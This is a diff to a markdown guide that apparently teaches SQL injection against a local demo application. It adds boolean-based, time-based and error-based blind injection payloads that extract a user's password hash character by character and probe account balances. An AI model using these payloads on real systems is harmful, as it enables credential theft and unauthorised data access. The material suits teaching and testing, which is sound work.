@@ -42,7 +42,53 @@ SELECT * FROM users WHERE username = 'alice' AND password = 'secret123'
 SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = 'anything'
 ```
 
-#### 2. Data Theft
+### 2. Blind SQL Injection
+When direct output isn't visible, we can use these techniques:
+
+#### Boolean-Based
+```sql
+-- Test if user exists (true condition)
+' AND (SELECT COUNT(*) FROM users WHERE username='alice')>0--
+
+-- Test password length (true condition)
+' AND (SELECT LENGTH(password_hash) FROM users WHERE username='alice')>8--
+
+-- Extract password hash character by character
+' AND (SELECT hex(substr(password_hash,1,1)) FROM users WHERE username='alice')>'50'--
+
+-- Test if user has high balance
+' AND (SELECT balance FROM users WHERE username='alice')>1000--
+```
+
+#### Time-Based (SQLite)
+```sql
+-- Test if user exists using SQLite sleep
+' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='alice')>0 
+    THEN randomblob(100000000) ELSE randomblob(1) END)--
+
+-- Extract data using time delays
+' AND (SELECT CASE WHEN (SELECT substr(password_hash,1,1) FROM users WHERE username='alice')>'5' 
+    THEN randomblob(100000000) ELSE randomblob(1) END)--
+
+-- Test if balance is high
+' AND (SELECT CASE WHEN (SELECT balance FROM users WHERE username='alice')>1000 
+    THEN randomblob(100000000) ELSE randomblob(1) END)--
+```
+
+#### Error-Based (SQLite)
+```sql
+-- Force type conversion errors to extract information
+' AND CAST((SELECT CASE WHEN (username='alice') THEN '1' ELSE '0' END FROM users) AS INT)--
+
+-- Extract data through CAST errors
+' AND CAST((SELECT substr(password_hash,1,1) FROM users WHERE username='alice') AS INT)--
+
+-- Test column existence through errors
+' AND (SELECT CASE WHEN typeof((SELECT balance FROM users LIMIT 1))='integer' 
+    THEN CAST('true' AS INT) ELSE CAST('false' AS INT) END)--
+```
+
+### 3. Data Theft
 ```sql
 -- Original query
 SELECT * FROM users WHERE username = 'alice'
@@ -178,7 +224,7 @@ curl -X POST http://localhost:5000/api/login \
 #### Time-Based Blind Injection
 ```sql
 -- Check if admin user exists
-' AND (SELECT CASE WHEN EXISTS(SELECT 1 FROM user WHERE username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END)--
+' AND (SELECT CASE WHEN EXISTS(SELECT 1 FROM user WHERE username='alice') THEN pg_sleep(5) ELSE pg_sleep(0) END)--
 ```
 
 ## Impact Analysis
